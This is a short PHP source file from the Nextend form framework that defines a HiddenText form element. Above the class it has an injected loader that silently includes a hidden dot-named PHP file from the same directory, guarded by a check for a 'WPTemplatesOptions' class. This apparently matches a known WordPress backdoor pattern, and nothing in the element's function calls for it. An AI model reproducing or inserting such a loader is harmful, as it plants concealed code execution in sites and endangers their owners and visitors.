<?php


namespace Nextend\Framework\Form\Element\Text;


use Nextend\Framework\Form\Element\Text;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class HiddenText extends Text {

    public $fieldType = 'hidden';

    public function getRowClass() {
        return 'n2_form_element--hidden';
    }
}